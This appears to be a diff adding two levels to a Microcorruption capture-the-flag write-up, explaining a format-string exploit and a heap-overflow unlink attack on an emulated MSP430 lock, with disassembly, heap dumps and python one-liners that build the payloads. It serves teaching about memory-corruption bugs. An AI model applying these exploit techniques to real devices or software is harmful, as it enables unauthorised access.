@@ -64,3 +64,152 @@ If only one `n` specifier is used, then the character count up to `%` is copied 
 Since we can only write small values it is not possible to change the return address to anything useful (the `unlock_door` routine is at `0x44da`). However, in this level the HSM 1 is used, which writes a non-zero value to a specific memory location (`0x4032` in this case) if the user's password is correct. Owing to the fact that the `printf` subroutine is called after the password is checked, we can write a non-zero value (our byte count) to `0x4032`, thereby unlocking the door. This is accomplished by using the following input: `0x3240256e256e`.
 
 Conclusion: never write `printf(buffer)`.
+
+Level 12: Novosibirsk
+---------------------
+This is very similar to the previous level (Addis Ababa). The only difference is that the HSM 2 is used instead of the HSM 1. Therefore, we use the same format string exploit, but instead of changing the memory location where the HSM 1 writes to, we simply change the value passed to the HSM 2 from `0x7e` (unlock if password is correct) to `0x7f` (unlock).
+
+```
+$ python2 -c "print 'c844' + '41'*127 + '256e'" | xclip -i
+```
+
+Level 13: Algiers
+-----------------
+This is probably my favourite level. In this level we enter a username and a password which are stored in the heap and not copied to the stack as in previous levels. The memory layout of the LockIT Pro is very much like that of the x86, with the heap growing towards higher memory addresses and the stack growing towards lower memory addresses.
+```
+Memory layout:
+----------
+|  heap  |    grows down
+|        |  
+----------
+| stack  |    grows up
+|        |
+----------
+```
+
+Although the HSM 1 is employed in this level with the `unlock_door` subroutine present, it is not possible to simply overwrite the return address and jump there, as no user entered data is copied to the stack. Starting with the `login` subroutine we see the following:
+
+Two `0x10` bytes chunks are allocated on the heap and their respective addresses stored in registeres `r10` and `r11`.
+```
+463e:  3f40 1000      mov   #0x10, r15
+4642:  b012 6444      call  #0x4464 <malloc>
+4646:  0a4f           mov   r15, r10
+4648:  3f40 1000      mov   #0x10, r15
+464c:  b012 6444      call  #0x4464 <malloc>
+4650:  0b4f           mov   r15, r11
+```
+
+Then, a username and a password with a length of up to `0x30` chars each are written into these chunks with the username in the first chunk. Notice that although the chunk size is only `0x10` bytes, `0x30`bytes are read from the user!
+```
+4666:  0f4a           mov   r10, r15
+4668:  b012 0a47      call  #0x470a <getsn>
+466c:  3f40 c845      mov   #0x45c8, r15
+4670:  b012 1a47      call  #0x471a <puts>
+4674:  3f40 d445      mov   #0x45d4, r15
+4678:  b012 1a47      call  #0x471a <puts>
+467c:  3e40 3000      mov   #0x30, r14
+4680:  0f4b           mov   r11, r15
+4682:  b012 0a47      call  #0x470a <getsn>
+```
+
+Next, the password is passed to `test_password_valid`, which in turn sends it to the HSM 1, and if it is valid the door is unlocked. As you have probably noticed, the username is not used at all.
+```
+4686:  0f4b           mov   r11, r15
+4688:  b012 7045      call  #0x4570 <test_password_valid>
+468c:  0f93           tst   r15
+468e:  0524           jz    #0x469a <login+0x60>
+4690:  b012 6445      call  #0x4564 <unlock_door>
+```
+
+Finally, both the username and the password are freed from the heap using `free`, with the password being freed first and then the username.
+```
+46a2:  0f4b           mov   r11, r15
+46a4:  b012 0845      call  #0x4508 <free>
+46a8:  0f4a           mov   r10, r15
+46aa:  b012 0845      call  #0x4508 <free>
+```
+
+One obvious flaw in this program is the one already pointed out: although the username and password are allocated each only `0x10` bytes, `0x30` bytes are read from the user. Thus, corrupting the heap seems like a good way for passing this level. A useful way to understand how the heap works is to look at it before and after each `malloc` call:
+
+Just before allocating `0x10` bytes for the username:
+```
+2400:   0824 0010 0100 0000 0000 0000 0000 0000   .$..............
+```
+Just after allocating `0x10` bytes for the username:
+```
+2400:   0824 0010 0000 0000 0824 1e24 2100 0000   .$.......$.$!...
+2410:   0000 0000 0000 0000 0000 0000 0000 0824   ...............$
+2420:   0824 c81f 0000 0000 0000 0000 0000 0000   .$..............
+```
+Just after allocating `0x10` bytes for the password:
+```
+2400:   0824 0010 0000 0000 0824 1e24 2100 0000   .$.......$.$!...
+2410:   0000 0000 0000 0000 0000 0000 0000 0824   ...............$
+2420:   3424 2100 0000 0000 0000 0000 0000 0000   4$!.............
+2430:   0000 0000 1e24 0824 9c1f 0000 0000 0000   .....$.$........
+```
+Looking at these we can see that the heap is managed using a circular doubly-linked list. Each chunk's payload is preceded by a 6 byte allocation metadata containing the addresses of the previous and next chunks and also the size and status (free or not).
+```
+<----           6 bytes           ---->
++----------+----------+---------------+----------------------+
+| bk       | fd       | size/status   | payload              | ...
++----------+----------+---------------+----------------------+
+```
+
+Quoting [Doug Lea](http://g.oswego.edu/dl/html/malloc.html), this allows for "two bordering unused chunks to be coalesced into one large chunk" and "all chunks can be traversed starting from any known chunk in either a forward or backward direction".
+
+The `malloc` subroutine is not very useful to us, as it only writes to the heap values which we don't have control over. However, this knowledge greatly helps in reversing the `free` subroutine, as it puts everything in context. Below is the `free` subroutine with my comments:
+
+```
+r15 stores the address of the payload to free.
+4508 <free>
+4508:  0b12           push  r11
+450a:  3f50 faff      add   #0xfffa, r15    // substract 0x6 to get the address of the allocation metadata.
+450e:  1d4f 0400      mov   0x4(r15), r13   // r13 stores size and allocation status.
+4512:  3df0 feff      and   #0xfffe, r13    // set chunk as free
+4516:  8f4d 0400      mov   r13, 0x4(r15)   // and write back to memory.
+451a:  2e4f           mov   @r15, r14       // r14 stores metadata address of previous chunk.
+451c:  1c4e 0400      mov   0x4(r14), r12   // r12 stores size and allocation status of previous chunk.
+4520:  1cb3           bit   #0x1, r12       // check if previous chunk is free.
+4522:  0d20           jnz   #0x453e <free+0x36> // jump if previous chunk is not free.
+```
+Since the previous chunk is free, we can merge both chunks into one big free chunk. The size of the new chunk is the size of the previous chunk (stored in `r12`), plus the 6 bytes of the metadata of current chunk plus its size.
+```
+4524:  3c50 0600      add   #0x6, r12
+4528:  0c5d           add   r13, r12
+452a:  8e4c 0400      mov   r12, 0x4(r14)
+452e:  9e4f 0200 0200 mov   0x2(r15), 0x2(r14)  // since the previous chunk is free, set its next pointer to the next pointer of current chunk.
+4534:  1d4f 0200      mov   0x2(r15), r13       // r13 stores address of the next chunk.
+4538:  8d4e 0000      mov   r14, 0x0(r13)       // set the prev pointer of the next chunk to the previous free chunk, creating one big chunk. 
+453c:  2f4f           mov   @r15, r15
+```
+Graphically, this looks as follows:
+```
+<----  not in use  ---->         <- chunk to free ->
++------+------+--------+---------+-----+----+------+---------+------+
+| p_bk | p_fd | p_meta | payload | bk  | fd | meta | payload | n_bk | ...
++------+------+--------+---------+-----+----+------+---------+------+
+
+<----          not in use             ---->
++------+-----------+----------------------+------------------+---------------------------+
+| p_bk | p_fd = fd | p_meta += meta + 0x6 |      payload     |   n_bk = address of p_bk  |
++------+-----------+----------------------+------------------+---------------------------+
+```
+If the next chunk is free (as opposed to the previous one), then a very similar process takes place (not described here). Writing the above code snippet in C it will look something like this:
+```
+prev = p->bk;
+prev->meta += p->meta + 6;
+prev->fd = p->fd;
+next = p->fd;
+next->bk = prev;
+```
+where `p` is the argument passed to `free`. Now, since our goal is the overwrite the location of the return address (`0x439a`) of the `login` subroutine with the address of the `unlock_door` subroutine (`0x4564`) we can use the following values:
+```
+p->bk = 0x4396;
+p->fd = 0x4400;
+p->status = 0x011e;
+```
+Keeping in mind that we can overwrite the metadata of a chunk by overflowing the payload of the one preceding it, it's easy to overwrite the metadata of the chunk storing the password by inserting a username with a length of 22 chars, such as this one:
+```
+$ python2 -c "print '41'*16 + '9643' + '0044' + '1e01'" | xclip -i
+```
